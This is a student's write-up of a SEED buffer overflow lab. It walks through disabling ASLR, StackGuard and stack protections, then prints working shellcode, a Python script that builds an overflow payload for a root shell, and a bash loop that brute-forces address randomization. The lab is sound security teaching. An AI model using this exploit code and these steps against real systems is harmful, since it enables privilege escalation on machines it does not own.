---
title: Buffer Overflow Vulnerability
weight: 10
---

# **Module 4 Lab: Buffer Overflow**

## **1 	Overview**

Learning Objective:

Students will gain first hand experience of the buffer overflow vulnerability. Buffer overflow is when  a program attempts to write data beyond the boundary of the space allocated for it in a fixed length buffer. The overwritten code, can be formatted in a way that the return address of the function points to malicious code. 

This lab covers the following topics:

* Buffer overflow vulnerability and attack
* stack layout in a function
* address randomization, non executable stack and StackGuard

## **2 	Lab tasks**

### **2.1 	Turning Off Countermeasures**

Address Space Randomization

Several linux based distros use address space randomization to randomize the starting address of th e stack and the heap. which makes guessing the address difficult, and guessing the address is one of the critical parts of the buffer overflow vulnerability. Use the following code to disable:

`sudo sysctl -w kernel.randomize_va_space=0`

StackGuard protection

A guard to prevent buffer overflow implemented with GCC. turn off with the following command during compilation:

`gcc -fno-stack-protector example.c`

Non-Executable stack

In Ubuntu they now longer allow executable stacks. To make the stacks executable use the following when compiling programs:

```bash
For executable stack:
$ gcc -z execstack  -o test test.c
For non-executable stack:
$ gcc -z noexecstack  -o test test.c
```

Configuring `/bin/sh`

In moderne versions of Ubuntu the `/bin/sh` program points at the newer `dash` program which has contermeasures that prevents itself from being executed in a `set-UID` program, because our victim program relies on being a `set-UID` program we need to change the shell program with the following command:

`sudo ln -sf /bin/zsh /bin/sh`

### **2.2	Task 1: Running Shellcode**

Shellcode is the code used to launch a shell program similar to using `execve()` to run `/bin/sh` within a c program. The program below from the SEED lab is used to launch `/bin/sh`

```c
/* call_shellcode.c  */

/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>

const char code[] =
  "\x31\xc0"             /* xorl    %eax,%eax              */
  "\x50"                 /* pushl   %eax                   */
  "\x68""//sh"           /* pushl   $0x68732f2f            */
  "\x68""/bin"           /* pushl   $0x6e69622f            */
  "\x89\xe3"             /* movl    %esp,%ebx              */
  "\x50"                 /* pushl   %eax                   */
  "\x53"                 /* pushl   %ebx                   */
  "\x89\xe1"             /* movl    %esp,%ecx              */
  "\x99"                 /* cdq                            */
  "\xb0\x0b"             /* movb    $0x0b,%al              */
  "\xcd\x80"             /* int     $0x80                  */
;

int main(int argc, char **argv)
{
   char buf[sizeof(code)];
   strcpy(buf, code);
   ((void(*)( ))buf)( );
} 
```

Compiling this code with `gcc -z execstack -o call_shellcode call_shellcode.c` gives the following, you can see using the `ps` command that we have one bash process and on sh process

![2-2task1](/images/2-2task1.png)

### **2.3	The Vulnerable Program**

The program `stack.c` from SEED labs is vulnerable to a buffer overflow attack because of the call to the `strcpy()` function. We need to exploit this vulnerability and gain root privilege. When Compiling `stack.c` make sure to turn off the StackGuard and the non executable stack protections. Also make sure to make the stack program a `set-UID` program like shown below.

![2.3](/images/2.3.png)

If we try to run stack right now then we just get a segmentation fault. We need to create a bad file with the `exploit.c` program to get root access.

### **2.4	Task 2: Exploiting the Vulnerability**

To exploit the vulnerability within the `stack` program we need to overflow the buffer and over write the return address of the `foo` functions stack frame, to point to or own malicious shellcode. In order to not have to just guess where the return address is I am going to re compile with gdb turned on in order to step through the program.

By creating a breakpoint in the program, at the function where the `strcpy()` function is we can use gdb to print out the return address. We know that in x86 architecture that the frame pointer is stored in the ebp register and we can print out that register in gdb by doing the following command:

![gedebp](/images/gedebp.png)

We can see the address of the buffer with gdb as well  like so:

![gdbbuffer](/images/gdbbuffer.png)

![bufferpicture](/images/bufferpicture.png)

Here is the contents of my `exploit.py` 

```python
#!/usr/bin/python3
import sys

shellcode= (
   "\x31\xc0"    # xorl    %eax,%eax
   "\x50"        # pushl   %eax
   "\x68""//sh"  # pushl   $0x68732f2f
   "\x68""/bin"  # pushl   $0x6e69622f
   "\x89\xe3"    # movl    %esp,%ebx
   "\x50"        # pushl   %eax
   "\x53"        # pushl   %ebx
   "\x89\xe1"    # movl    %esp,%ecx
   "\x99"        # cdq
   "\xb0\x0b"    # movb    $0x0b,%al
   "\xcd\x80"    # int     $0x80
).encode('latin-1')


# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

# Put the shellcode at the end
start = 517 - len(shellcode) 
content[start:] = shellcode

##################################################################
ret = 0xbfffeb18 + 120   # replace 0xAABBCCDD with the correct value
offset = 36            # replace 0 with the correct value

content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

Notice that return address has been pushed forward 120 bytes, this is because when stack is run with gdb the stack frame may not be exactly the same as when gdb is turned off. This doesn't change very much because most of the bad file is just filled with `0x90` or the `NOP` command. Notice the offset it the 36 bytes from the end of the buffer to the return address. 

When I run the `exploit.py` script then a bad file is generated, which gives me access to the root shell when `stack` is run. Shown below:

![2-4rootshell](/images/2-4rootshell.png)

### **2.5	Task 3: Defeating dash's Countermeasure**

`dash` drops the privileges when the effective UID does not match the real UID, but this countermeasure can be defeated by not using the `/bin/sh` in the shellcode, and instead use a different shellcode.

First we need to change back the symbolic link between `/bin/sh` and `dash` with the following command:

`sudo ln -sf /bin/dash /bin/sh`

Within the `dash_shell_test.c` program there is a line to set the user id to 0, or the root user id. When you run the program with that line commented out, you only get a normal shell. However when run again with the `setuid(0);` line uncommented then we get the root shell, which means our shellcode can be changed to get around the dash counter measure.

I then went and changed the shellcode with `exploit.py` to the updated shellcode from the lab description. After running the exploit script again I was able to get another root shell with dash being used.

![2-5root](/images/2-5root.png)

### **2.6	Task 4: Defeating Address Randomization**

In order to try and defeat the address Randomization we need to turn that counter measure back on:

`sudo /sbin/sysctl -w kernel.randomize_va_space=2`

On 32 bit linux machines the stack only has 19 bits of entropy. Meaning there is only {{<katex>}} 2^{19} = 524,288 

{{</katex>}} possibilities. This can be defeated by brute force, with the following bash script.

```bash
#!/bin/bash
SECONDS=0
value=0
while [ 1 ]
	do
	value=$(( $value + 1 ))
	duration=$SECONDS
	min=$(($duration / 60))
	sec=$(($duration % 60))
	echo "$min minutes and $sec seconds elapsed."
	echo "The program has been running $value times so far."
	./stack
done
```

After Letting the script run for a little while I was able to get the root shell, it took about 24,687 times shown here:

![bruteforce](/images/bruteforce.png)

### **2.7	Task 5: Turn on the StackGuard Protection**

Make sure to turn of the address randomization before attempting this or else you wont know what stopped your attack from working.

Now I need to recompile `stack.c` with the stack protections on like this:

`gcc  -o stack -z execstack  stack.c`

![stackGurad](/images/stackGurad.png)

As you can see above the attack no longer works because the StackGuard has detected that the stack has been smashed and automatically aborts the program.

### **2.8	Task 6: Turn on the Non-executable Stack protection**

First we need to recompile the vulnerable `stack.c` program to  to use the non executable stack protection with the following command:

`gcc -o stack -fno-stack-protector -z noexecstack stack.c`

When I try to run the vulnerable program again I get a segmentation fault, because this protection makes it so that I can not execute the code on the stack, making it impossible to run the shellcode that was injected from the `badfile`. However this does not prevent a buffer overflow from actually occurring.

